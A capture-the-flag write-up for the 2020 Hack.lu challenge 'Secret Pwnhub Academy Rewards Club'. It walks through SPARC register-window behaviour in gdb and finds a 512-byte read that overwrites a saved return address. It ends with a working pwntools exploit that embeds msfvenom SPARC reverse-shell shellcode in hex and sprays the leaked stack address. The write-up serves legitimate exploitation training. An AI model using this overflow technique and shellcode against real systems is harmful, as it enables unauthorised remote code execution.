# 2020 Hack.lu CTF - Secret Pwnhub Academy Rewards Club

We are provided with an ELF SPARC executable, Dockerfile and several scripts so we can easily setup the environment.

Since I did not know anything about SPARC, I had to research on how SPARC works, what are the registers, etc. Since time was of the essence here, I did not dive deep into the whole SPARC architecture, but there were several things that I noted from the research:
- `%pc` is the equivalent of the instruction pointer
- there is a stack, `%sp` is the stack pointer (top) and `%fp` frame pointer (bottom)
- there are 8 different _in_ and _out_ registers `%o0`-`%o7` and `%i0`-`%i7`
- when calling a function the `%o7` register will store the return address before executing the function and afterwards swap it to the `%i7` register
- if the `%i7` register is already filled out, the current value of `%i7` register will get stored on the stack

This means that if there is a function call inside a function call the `%i7` register of the first function call will get stored on the stack which we may be able to overwrite making it jump to address of our choice.

## SPARC binary analysis

Execution will start with `_start` function that calls the `main` (`0x104b4`) via `libc_main` function:
```
gdb-peda$ x/48i _start
   0x100f0 <_start>:	mov  %g0, %fp
   0x100f4 <_start+4>:	sub  %sp, 0x18, %sp
   0x100f8 <_start+8>:	ld  [ %sp + 0x58 ], %o1
   0x100fc <_start+12>:	add  %sp, 0x5c, %o2
   0x10100 <_start+16>:	sethi  %hi(0x10400), %o0       <-- store 0x10400 in %o0
   0x10104 <_start+20>:	sethi  %hi(0x10000), %o3
   0x10108 <_start+24>:	sethi  %hi(0x1c400), %o4
   0x1010c <_start+28>:	or  %o0, 0xb4, %o0             <-- or 0x10400, 0xb4 = 0x104b4 <main>
   0x10110 <_start+32>:	or  %o3, 0xd4, %o3
   0x10114 <_start+36>:	or  %o4, 0x268, %o4
   0x10118 <_start+40>:	mov  %g1, %o5
   0x1011c <_start+44>:	call  0x14960 <__uClibc_main>  <-- calls func pointer in %o0
   ...
```

At this point we should observe the return address to `libc_main` in `%i7` register:

```
gdb-peda$ i r $pc
pc             0x104c4             0x104c4 <main+16>     <-- we are in main
gdb-peda$ i r $i7
i7             0x14c88             0x14c88               <-- return addr
gdb-peda$ x/4i 0x14c80
   0x14c80 <__uClibc_main+800>:	ld  [ %g1 ], %o2
   0x14c84 <__uClibc_main+804>:	ld  [ %fp + 0x44 ], %g1
   0x14c88 <__uClibc_main+808>:	call  %g1                <-- libc_main calls main
   0x14c8c <__uClibc_main+812>:	ld  [ %fp + 0x48 ], %o0
```

Function `main` will call another function named `setup`:

```
gdb-peda$ x/6i 0x104b4
   0x104b4 <main>:	std  %fp, [ %sp + 0x38 ]
   0x104b8 <main+4>:	add  %sp, -96, %sp
   0x104bc <main+8>:	sub  %sp, -96, %fp
   0x104c0 <main+12>:	mov  %o7, %i7
   0x104c4 <main+16>:	call  0x102a4 <setup>    <-- call here
   0x104c8 <main+20>:	nop 
```

When executing first 4 instructions in the `setup` function, this is what we expect:
- old `%i7` register value `0x14c88` is now on the stack
- new `%i7` register value is set to `0x104c4`

Here are the first 4 instructions:
```
gdb-peda$ x/4i $pc
=> 0x102a4 <setup>:	std  %fp, [ %sp + 0x38 ]
   0x102a8 <setup+4>:	add  %sp, -96, %sp
   0x102ac <setup+8>:	sub  %sp, -96, %fp
   0x102b0 <setup+12>:	mov  %o7, %i7
```

Let's verify:
```
gdb-peda$ x/4i $pc - 4
   0x102b0 <setup+12>:	mov  %o7, %i7
=> 0x102b4 <setup+16>:	sethi  %hi(0x2e000), %g1
   0x102b8 <setup+20>:	or  %g1, 0x130, %g1	! 0x2e130 <stdin>
   0x102bc <setup+24>:	ld  [ %g1 ], %g1
gdb-peda$ x/48wx $sp
0xffffe2a8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe2b8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe2c8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe2d8:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe2e8:	0x00000000	0x000000b0	0x00000000	0x00031c7f
0xffffe2f8:	0x15010000	0x0011131a	0x00120f17	0x16000000
0xffffe308:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe318:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe328:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe338:	0x00000000	0x00000000	0xffffe368	0x00014c88   <-- observe value
0xffffe348:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffe358:	0x00000000	0x00000000	0x00000000	0x00000000
gdb-peda$ i r $i7
i7             0x104c4             0x104c4
```

Bingo :)

## Vulnerability

Deeper analysis shows that `main` calls another function `fn` that performs the `read` function call. I disassembled the `fn` function with Ghidra and saw that the expected input length is `0x200`, this is also seen via assembly. The `fn` function checks the `%g1` register at `0x1045c` before jumping to the end of the function. The value of `alread_read` is checked against `0x200`. 

If we analyse the stack when executing the `fn` function, the stack pointer is set to `0xffffe228` and our `0x00014c88` value is stored on the stack at `0xffffe344` which would mean that we will be able to overwrite the stored register value since the input size allowed is 512 (`0x200`) bytes:

```
>>> 0xffffe344-0xffffe228
284
>>> 0x200
512
```

But where can we redirect execution? That one is solved from the start since the binary outputs the value of the (stack pointer + 8) when you run it.

## Exploitation

To quickly get to the flag, the idea was to write the payload first and then just spray the address to the rest of the memory while keeping the stack alignment in mind.

There was just one catch to this approach which I have noticed an hour after trying to redirect execution to the start of the stack - the first 4 bytes of the stack were changed by the binary while the `fn` function was executing. In order to overcome this, the final exploit idea was:

- write 4 bytes of junk
- write payload
- align the payload on the stack if needed
- spray the (start of stack address + 4) for the remaining available bytes

The payload used was `solaric/sparc/shell_reverse_tcp` with `127.0.0.1` and `1337` as parameters. This immediately spawned a shell within the program. I am still not sure why that happened. This worked both locally and against the remote server and that was good enough to get the flag. Maybe there is some kind of `execve` syscall in the payload somewhere which spawned the shell?

This is the finalized script:
```python
from pwn import *
from binascii import unhexlify

#  msfvenom -p solaris/sparc/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f hex
shellcode_hex = "9c2ba00798102001961ac00b941ac00b9210200290102002821020e691d02008d023bff8941020039210200994a2a0018210203e91d0200812bffffcd003bff821000081a0142139231fc000a2146001e03bbff09223a01094102010821020eb91d02008941ac00b210bd89aa014216e230bdcda9023a0109223a008e03bbff0d023bff8c023bffc8210203b91d02008"
shellcode = unhexlify(shellcode_hex)

context.arch = 'sparc'

r = remote('localhost', 4444)

addr_hex = r.recvline()[-5:-1]
print(addr_hex)

addr = b"\xff\xff" + p16(int(addr_hex, 16)-8+4)
payload  = b"\xff\xff\xff\xff"
payload += shellcode
payload += addr * (91) # ((0x200-144)/4)-1

r.sendline(payload)
r.interactive()
```

